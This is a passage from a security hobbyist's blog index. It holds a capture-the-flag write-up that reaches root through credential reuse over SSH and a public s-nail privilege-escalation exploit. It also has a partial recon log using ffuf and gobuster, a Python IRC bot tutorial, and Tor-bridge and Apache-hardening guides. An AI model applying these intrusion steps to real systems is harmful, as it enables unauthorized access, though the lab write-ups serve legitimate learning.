as chad:we have the directory ftp with the chadinfo,and also user.txt.I download and read it. flag 1&#x2F;2 ░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ ░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ ░░░░█░░░░░░░░░░░░░░░░░░░░░░█ ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ ░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ █░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ █░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ ░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ ░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ ░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ ░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ ░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ ░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ ░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ ░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ ░░█░░▌░█░░█░░█░░░█░░█░░█ ░░█░░▀▀░░██░░█░░░█░░█░░█ ░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ Nice, I think I’m done with the ftp, I go to sleep I will continue tomorrow. Port 22I’m back. I will try to connect to ssh with previous creds:User: chadPassword: maidenstower ssh chad@192.168.0.19 I’m in! I am in his home directory, I will display what’s in: ls -la drwxr-xr-x 4 chad chad 4096 Jul 16 06:51 . drwxr-xr-x 3 root root 4096 Feb 7 14:57 .. dr-xr-xr-x 2 chad chad 4096 Feb 7 16:41 ftp drwx------ 3 chad chad 4096 Jul 16 06:51 .gnupg -r-x------ 1 chad chad 1805 Jan 3 2021 user.txt .gnupg seem intresting I have the directory private-keys-v1.d, but it’s empty. Vulnerability AssessmentFind permsHausec pentest-cheatsheepFind Binaries that will execute as the owner:find / -perm -u=s -type f 2&gt;/dev/nullThis is what I found: &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign &#x2F;usr&#x2F;lib&#x2F;s-nail&#x2F;s-nail-privsep &#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device &#x2F;usr&#x2F;bin&#x2F;passwd &#x2F;usr&#x2F;bin&#x2F;mount &#x2F;usr&#x2F;bin&#x2F;chfn &#x2F;usr&#x2F;bin&#x2F;umount &#x2F;usr&#x2F;bin&#x2F;newgrp &#x2F;usr&#x2F;bin&#x2F;su &#x2F;usr&#x2F;bin&#x2F;gpasswd &#x2F;usr&#x2F;bin&#x2F;chsh s-nail look instresting:s-nail -V v14.8.6 ExploitI found this on exploit database:S-nail &lt; 14.8.16 - Local Privilege Escalation14.8.6 = 14.8.60 or 14.8.06 ?Let’s try it. touch exploit.shvi exploit.shPast this: https://www.exploit-db.com/raw/47172Escape, :wq.chmod + x exploit.sh./exploit.shResult: [-] Failed. Not vulnerable? [.] Cleaning up... [-] Failed This is the only exploit on exploit database, what I did wrong?I’m trying to download the file in the chad machine but the terminal is so buggy.I will use scp to give him the file.scp 47172.sh chad@192.168.0.19:/tmp/exploit.shType the password: maidenstowerI have to run is with bash because ./ don’t work, and I have too much errors now.I think the machine is broken or maybe my shell,I have some errors and it’s my first CTF with this machine.I fixed it with this here.So let’s run the script and fail again, so I spamed it and I’m in! I will change my shell /bin/bash.I’m roo so let’s see what is in /root/ directory. # cat root.txt flag 2&#x2F;2 ░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ ░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ ░░░░█░░░░░░░░░░░░░░░░░░░░░░█ ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ ░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ █░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ █░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ ░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ ░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ ░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ ░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ ░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ ░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ ░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ ░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ ░░█░░▌░█░░█░░█░░░█░░█░░█ ░░█░░▀▀░░██░░█░░░█░░█░░█ ░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ congratulations! Nice, the CTF is over, it was easy.There is an image, I will download it:Receiver machine: nc -l -p 1234 &gt; chad.pngSender machine: nc -w 192.168.0.16 &lt; chad.png This is the end, I hope you liked it, it was my first writeup.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"Create an IRC bot with python","slug":"Create an IRC bot with python","date":"2021-06-22T03:25:00.000Z","updated":"2023-04-12T14:14:27.251Z","comments":true,"path":"/post/Create an IRC bot with python.html","link":"","permalink":"https://peanutstick.github.io/post/Create%20an%20IRC%20bot%20with%20python.html","excerpt":"","text":"Create an IRC bot with pythonPrograming IRC Python Created At : 2021-06-21 21:25 Count:544 Views 👀 :2220 Create an IRC bot with Python3Installation of python3.apt update apt upgrade apt install python3 Create the project and start to code.You have to create a file like “main.py” in a directory where will be your bot. Import some necessary libraries.In main.py. import socket, ssl, threading import score_board as score Add the configuration variables.Don’t forget to comment the code, it’s important. server = 'irc.evilcorp.ga' # Server port = 6697 # Port channel = \"#lobby\" # Channel botnick = \"Dovahkiin\" # Your bots nick password = \"\" user = botnick + \" \" + botnick + \" \" + botnick + \" \" + \"HODL the line apes!\" # This is username, hostname, identity and description in the order Connect to the serversocketHandler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# Opening up a normal socket. socketHandler.connect((server,port))# Binding socket to socket address(server ip and port). ircsock = ssl.wrap_socket(socketHandler)# Wraping the socket with ssl. ircbuff = ircsock.recv(2048).decode('utf-8') # Receive buffer from the server. ircbuff = ircbuff.strip('\\r\\n') # Removing any unnecessary linebreaks. print(ircbuff) # Printing buffer for once. del ircbuff # Deleting buffer for re-use. ircsend(\"NICK \"+ botnick +\"\\r\\n\") # Here we actually assign the nick to the bot print(\"Sending Nick \" + botnick + \" to server\") ircsend(\"USER \"+ user + \"\\r\\n\") # User authentication print(\"Sending UserName and hostname and identity and description \\\"\" + user + \"\\\" to server\") Create the loop to receive the bufferwhile 1: # Be careful with these! it might send you to an infinite loop ircbuff = ircsock.recv(2048).decode('utf-8') # Receive buffer from the server. ircbuff = ircbuff.strip('\\r\\n') # Removing any unnecessary linebreaks. print(ircbuff) # Here we print the buffer from the server. if ircbuff.find(\"PING :\") != -1: # If the server pings us then we've got to respond! ping(ircbuff) elif ircbuff.find(\"NOTICE \" + botnick + \" ::This nickname is registered\") != -1: ircsend(\"/msg NickServ IDENTIFY \"+password) elif ircbuff.find(\"NOTICE \" + botnick + \" :*** You are connected to\") != -1: # If connected successfully, do the below functions and codes. joinchan(channel) # Join the channel using the functions we previously defined And your code will be just after that with an another elif, like this: elif ircbuff.find(\"coffee\") != -1: # Bring you a coffee coffee() And we delete the buffer because the script will process the previous messages and send too much messages to the server. del ircbuff now we have to create the function: ping for ping(ircbuff) ircsend for ircsend(“/msg NickServ IDENTIFY “+password) joinchan for joinchan(channel) coffee for coffee() Create the functionsdef ircsend(msg): # I had to make another function for send() because in python3 and above the socket incoming and outgoing messages are in bytes format. So you have to encode and decode it accordingly. ircsock.send(msg.encode('utf-8')) def ping(ircbuff): # This is our first function! It will respond to server Pings. pongReply = ircbuff.split(':',1)[-1] # This strips out ping reply and server name for pong. If not defined it can cause the bot to break in some servers ircsend(\"PONG :\" + pongReply + '\\r\\n') def joinchan(chan): # This function is used to join channels. ircsend(\"JOIN \"+ chan +\"\\r\\n\") def coffee(): # This function responds to a user that inputs \"Hello Mybot\" ircsend(\"PRIVMSG \"+ channel +\" : ,--.\\r\\n\") ircsend(\"PRIVMSG \"+ channel +\" : C|:p| Here is your coffee !\\r\\n\") ircsend(\"PRIVMSG \"+ channel +\" : `=='\\r\\n\") ThanksThank to Shadow Lobster for the help.","categories":[{"name":"dev","slug":"dev","permalink":"https://peanutstick.github.io/categories/dev/"}],"tags":[{"name":"IRC","slug":"IRC","permalink":"https://peanutstick.github.io/tags/IRC/"}]},{"title":"OpenVPN","slug":"OpenVPN","date":"2021-06-20T23:53:00.000Z","updated":"2023-04-12T14:14:27.274Z","comments":true,"path":"/post/OpenVPN.html","link":"","permalink":"https://peanutstick.github.io/post/OpenVPN.html","excerpt":"","text":"OpenVPNService VPN Created At : 2021-06-20 17:53 Count:41 Views 👀 :2221 How to create a VPN with OpenVPNDownload the script wget https://raw.githubusercontent.com/angristan/openvpn-install/master/openvpn-install.sh And them run it: chmod +x openvpn-install.sh./openvpn-install.sh That’s all, I hope you liked it.","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"VPN","slug":"VPN","permalink":"https://peanutstick.github.io/tags/VPN/"}]},{"title":"agile","slug":"CTF agile","date":"2021-04-13T01:15:00.000Z","updated":"2023-04-25T15:21:16.507Z","comments":true,"path":"/post/CTF agile.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20agile.html","excerpt":"","text":"rustscanrustscan -a 10.10.11.203 Output: PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack Subdomainffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.agile.htb\" -u http://agile.htb -fs 178 Web agile.htbWapalizer Nginx 1.18.0 Debugger(function() &#123; if (window.scriptExecuted1681322012868) &#123; return; &#125; var script = document.createElement(\"script\"); script.setAttribute(\"type\", \"text/javascript\"); script.textContent = \"\\n\\ (function () &#123;\\n\\ try &#123;\\n\\ \\n\\ &#125; catch (ex) &#123;\\n\\ console.error(\\'Error executing js: \\' + ex);\\n\\ &#125;\\n\\ &#125;)();\\n\\ \"; var FRAME_REQUESTS_LIMIT = 500; var frameRequests = 0; function waitParent() &#123; frameRequests += 1; var parent = document.head || document.documentElement; if (parent) &#123; try &#123; parent.appendChild(script); parent.removeChild(script); &#125; catch (e) &#123;&#125; finally &#123; window.scriptExecuted1681322012868 = true; return true; &#125; &#125; if (frameRequests &lt; FRAME_REQUESTS_LIMIT) &#123; requestAnimationFrame(waitParent); &#125; &#125; waitParent(); &#125;)() Gobustergobuster dir -u http://agile.htb/ -x html,php,js,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Création d'un relais tor avec debian 10","slug":"Création d'un relais tor avec debian 10","date":"2021-04-09T19:45:00.000Z","updated":"2023-04-12T14:14:27.254Z","comments":true,"path":"/post/Création d'un relais tor avec debian 10.html","link":"","permalink":"https://peanutstick.github.io/post/Cr%C3%A9ation%20d'un%20relais%20tor%20avec%20debian%2010.html","excerpt":"","text":"Ajout du dépôtOn ajoute le dépôt de tor a nos source list, je prend jessie mais cela dépend de votre debian:https://2019.www.torproject.org/docs/debian.htmlDans le fichier /etc/apt/source.list ajoutez ces lignes: deb https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org jessie main deb-src https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org jessie main Ajout de la clée GPG pour signer les packetsVous aurez besoins de curl. sudo apt install curl Ensuite ajoutez la clés. curl https:&#x2F;&#x2F;deb.torproject.org&#x2F;torproject.org&#x2F;A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | gpg --import gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | apt-key add - Installation de torapt update apt install tor deb.torproject.org-keyring Configuration du relaisOn vas copier le fichier de conf puis l’éditer. sudo mv &#x2F;etc&#x2F;tor&#x2F;torrc &#x2F;etc&#x2F;tor&#x2F;torrc.default sudo nano &#x2F;etc&#x2F;tor&#x2F;torrc J’y ai mis le minimum, je vous conseille de lire la doc si vous avez besoins de plus de paramètres. ##default bridge port 443 ORPort 1339 ##uncomment if you don&#39;t want torproject.org to know your bridge PublishServerDescriptor 0 Nickname [à changer] ContactInfo [à changer] ##leave rest unchanged log notice file &#x2F;var&#x2F;log&#x2F;tor&#x2F;tor.log SocksPort 0 BridgeRelay 1 Exitpolicy reject *:* ORPort 1339C’est mon numéro de port, de base c’est 443. PublishServerDescriptor 0Pour ne pas montrer son bridge, je préfère ne pas le montrer car il ne sert qu’a une personne. log notice file /var/log/tor/tor.logChemin du fichier de log. Ensuite on verifie que la config est bonne. sudo -u debian-tor tor --verify-config teste du relaisOn redémare tor. sudo service tor restart Puis on regarde les logs. tail -f &#x2F;var&#x2F;log&#x2F;syslog | grep tor -i Si vous ne voyez pas de warning c’est que cela fonctionne, vous devriez voir des [notice]seulement. Ajout du relaisOuvrez votre navigateur tor browser.Allez dans option puis tor.Cochez la case utiliser un pont puis fournir un pontVous y entrer l’adresse IP du serveur ainsi que le port.Pour ma part c’est 93.95.226.163:1339.Puis redemarer le navigateur. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"Security","slug":"Security","permalink":"https://peanutstick.github.io/categories/Security/"}],"tags":[{"name":"tor","slug":"tor","permalink":"https://peanutstick.github.io/tags/tor/"}]},{"title":"Securing an apache server","slug":"Securing an apache server","date":"2021-03-09T18:45:00.000Z","updated":"2023-04-12T14:14:27.277Z","comments":true,"path":"/post/Securing an apache server.html","link":"","permalink":"https://peanutstick.github.io/post/Securing%20an%20apache%20server.html","excerpt":"","text":"Disable indexing/etc/apache2/apache2.conf It must be activated on all &lt;Directory /path&gt; except at the root &lt;Directory /var/www/&gt;Options Indexes FollowSymLinksAllowOverride NoneRequire all granted To deactivate the directory listing, edit the second line: &lt;Directory /var/www/&gt;Options FollowSymLinksAllowOverride NoneRequire all granted Restrict access to the configuration filesIt’s possible to download the files even if the indexing is disabled To block txt files &lt;Files ~ “.txt$”&gt;Order allow,denyDeny from all Hide version of ApacheWe can see the apache version easily in the network tab while you use the inspector /etc/apache2/apache2.confAdd these lines at the bottom : ServerTokens ProdServerSignature Off Disable ETagsETag is a server response header that allows browsers to make conditional requests and perform cache validation efficiently. On the other hand, it poses security risks in case it gets leaked by your code, and can result in cache poisoning attack on your website. So it is better to disable ETag if your website does not need it.https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag /etc/apache2/apache2.confAdd this line at the bottom : FileETag None Removal of guest rights cd /etc/apache2chmod 750 * -R 7 = All rights for the root user 5 = Read and execute for the group 0 = Nothing for guest Securing against http Verb TamperingHTTP Verb Tampering is an attack that exploits vulnerabilities in HTTP verbauthentication and access control mechanisms. Upload the file image.php.png The file valide because of png Pausing the request Rename the file in image.php The file image.php is on the server /etc/apache2/apache2.conf Add Deny from all like this but don’t us it in the root: Deny from all https://stackoverflow.com/questions/40914743/apache-limitexcept-only-to-get-and-post-methods Xss protectionEnable this module a2enmod headers /etc/apache2/apache2.conf Add the like like this: Header set X-XSS-Protection \"1; mode=block\" Restriction du fichier .htaccessOn empêche la lecture du fichier htaccess par un utilisateur \\&lt;Directory &#x2F;\\&gt; AllowOverride None \\&lt;&#x2F;Directory\\&gt; Protection contre le vol de cookieNe Pas le faire pour iTop, il demande une connexion a chaque page caril garde la connexion grâce au cookie et pas avec une variable desession !!! Puis dans le fichier /etc/apache2/apache2.conf on ajoute. \\&lt;Directory &#x2F;\\&gt; Header edit Set-Cookie \\^(.\\*)\\$ \\$1;HttpOnly;Secure \\&lt;&#x2F;Directory\\&gt; Protection contre le clickJackingDans le fichier /etc/apache2/apache2.conf on ajoute \\&lt;Directory &#x2F;\\&gt; Header always append X-Frame-Options SAMEORIGIN \\&lt;&#x2F;Directory\\&gt; Limiter les DOSDans le fichier /etc/apache2/apache2.conf On passe le timeout de 300 à 10. MaxClients 150 KeepAlive On MaxKeepAliveRequests 100 KeepAliveTimeout 10 Il ne sera pas totalement protégé mais il sera moins vulnérable. Cacher le manuel apache2Le manuel permet d’avoir la version d’apache2 nano /etc/apache2/conf-available/apache2-doc.conf Commentez la première ligne Protection contre le reniflage MIME[https://www.keycdn.com/support/what-is-mime-sniffing]](https://www.keycdn.com/support/what-is-mime-sniffing]](https://www.keycdn.com/support/what-is-mime-sniffing)) nano /etc/apache2/conf-available/security.conf Ajoutez ces lignes \\&lt;IfModule mod\\_headers.c\\&gt; Header always set X-Content-Type-Options \\&quot;nosniff\\&quot; \\&lt;&#x2F;IfModule\\&gt; Restreindre l’accès à /icons/READMEnano /etc/apache2/apache2.conf \\&lt;Directory \\&quot;&#x2F;usr&#x2F;share&#x2F;apache2&#x2F;icons\\&quot;\\&gt; Options FollowSymlinks AllowOverride None Order allow,deny Deny from all \\&lt;&#x2F;Directory\\&gt; Mise en place de ModsecurityInstallationModsecurity est un pare-feu applicatif, dont le rôle est de filtrer lesrequêtes entrant sur un serveur HTTP Apache. Il se présente sous laforme d’un module apache, qui analyse les requêtes reçues grâce àl’emploi d’une base des règles de requêtes considérées comme nonsouhaitées. https://www.inmotionhosting.com/support/server/apache/install-modsecurity-apache-module/ sudo apt update -y sudo apt install libapache2-mod-security2 sudo systemctl restart apache2 Vérification que le paquet a une version supérieure à 2.9 apt-cache show libapache2-mod-security2 | grep -E‘(Version|Package)’ sudo cp /etc/modsecurity/modsecurity.conf-recommended/etc/modsecurity/modsecurity.conf sudo nano /etc/modsecurity/modsecurity.conf Changer SecRuleEngine DetectionOnly pour SecRuleEngine On ConfigurationOn télécharge la config d’OWASP, un organisme reconnu dans le monde dela sécu. Cd /tmp wget https://github.com/coreruleset/coreruleset/archive/v3.3.0.zip unzip FileName.zip mv coreruleset-3.3.0/crs-setup.conf.example/etc/modsecurity/crs-setup.conf mv coreruleset-3.3.0/rules/ /etc/modsecurity/ nano /etc/apache2/mods-enabled/security2.conf Ajoutez ça et commentez commentez la dernière ligne. IncludeOptional &#x2F;etc&#x2F;modsecurity&#x2F;\\*.conf Include &#x2F;etc&#x2F;modsecurity&#x2F;rules&#x2F;\\*.conf systemctl restart apache2 LogsOn peut observer en direct les logs avec tail -f /var/log/apache2/error.log (liste les attaques et warning) tail -f /var/log/apache2/modsec_audit.log (liste tout) tail -f /var/log/apache2/access.log (logs clairs avec IP re ressourcechargée) Fail2banScansNiktoNikto -host 192.168.101.147 -o scan_iTop.html DirbDirb http://192.168.101.147 Pour l’aide : dirb Il est possible de changer de word list : dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"Security","slug":"Security","permalink":"https://peanutstick.github.io/categories/Security/"}],"tags":[{"name":"webserver","slug":"webserver","permalink":"https://peanutstick.github.io/tags/webserver/"}]}],"categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"},{"name":"Security","slug":"Security","permalink":"https://peanutstick.github.io/categories/Security/"},{"name":"Tips","slug":"Tips","permalink":"https://peanutstick.github.io/categories/Tips/"},{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"},{"name":"Fix","slug":"Fix","permalink":"https://peanutstick.github.io/categories/Fix/"},{"name":"dev","slug":"dev","permalink":"https://peanutstick.github.io/categories/dev/"}],"tags":[{"name":"Pivot","slug":"Pivot","permalink":"https://peanutstick.github.io/tags/Pivot/"},{"name":"Windows","slug":"Windows","permalink":"https://peanutstick.github.io/tags/Windows/"},{"name":"CMS","slug":"CMS","permalink":"https://peanutstick.github.io/tags/CMS/"},{"name":"LFI","slug":"LFI","permalink":"https://peanutstick.github.io/tags/LFI/"},{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"},{"name":"CVE","slug":"CVE","permalink":"https://peanutstick.github.io/tags/CVE/"},{"name":"steganography","slug":"steganography","permalink":"https://peanutstick.github.io/tags/steganography/"},{"name":"sql","slug":"sql","permalink":"https://peanutstick.github.io/tags/sql/"},{"name":"lfi","slug":"lfi","permalink":"https://peanutstick.github.io/tags/lfi/"},{"name":"Buffer overflow","slug":"Buffer-overflow","permalink":"https://peanutstick.github.io/tags/Buffer-overflow/"},{"name":"sqli","slug":"sqli","permalink":"https://peanutstick.github.io/tags/sqli/"},{"name":"privesc","slug":"privesc","permalink":"https://peanutstick.github.io/tags/privesc/"},{"name":"Youtube","slug":"Youtube","permalink":"https://peanutstick.github.io/tags/Youtube/"},{"name":"pwn","slug":"pwn","permalink":"https://peanutstick.github.io/tags/pwn/"},{"name":"cms","slug":"cms","permalink":"https://peanutstick.github.io/tags/cms/"},{"name":"Arch","slug":"Arch","permalink":"https://peanutstick.github.io/tags/Arch/"},{"name":"bruteforce","slug":"bruteforce","permalink":"https://peanutstick.github.io/tags/bruteforce/"},{"name":"database","slug":"database","permalink":"https://peanutstick.github.io/tags/database/"},{"name":"SSTI","slug":"SSTI","permalink":"https://peanutstick.github.io/tags/SSTI/"},{"name":"pivot","slug":"pivot","permalink":"https://peanutstick.github.io/tags/pivot/"},{"name":"api","slug":"api","permalink":"https://peanutstick.github.io/tags/api/"},{"name":"Rice","slug":"Rice","permalink":"https://peanutstick.github.io/tags/Rice/"},{"name":"ffmpeg","slug":"ffmpeg","permalink":"https://peanutstick.github.io/tags/ffmpeg/"},{"name":"rice","slug":"rice","permalink":"https://peanutstick.github.io/tags/rice/"},{"name":"sqlmap","slug":"sqlmap","permalink":"https://peanutstick.github.io/tags/sqlmap/"},{"name":"Linux, Gaming","slug":"Linux-Gaming","permalink":"https://peanutstick.github.io/tags/Linux-Gaming/"},{"name":"arch","slug":"arch","permalink":"https://peanutstick.github.io/tags/arch/"},{"name":"IRC","slug":"IRC","permalink":"https://peanutstick.github.io/tags/IRC/"},{"name":"VPN","slug":"VPN","permalink":"https://peanutstick.github.io/tags/VPN/"},{"name":"tor","slug":"tor","permalink":"https://peanutstick.github.io/tags/tor/"},{"name":"webserver","slug":"webserver","permalink":"https://peanutstick.github.io/tags/webserver/"}]}